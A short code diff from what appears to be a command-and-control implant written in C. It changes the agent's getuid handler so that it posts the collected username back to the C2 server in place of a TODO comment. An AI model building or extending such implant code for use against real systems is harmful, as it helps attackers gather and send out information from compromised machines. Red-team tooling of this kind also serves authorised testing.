@@ -44,7 +44,7 @@ void agent_exit(AgentState *state, AgentCapabilities *cap) {
 void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *username = cap->GetuidPicoEntrypoint();
 	
-	// TODO communicate data or error to C2
+	perform_post(state, task, username, "success"); // TODO check if username is null and perform post based on that
 }
 
 void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
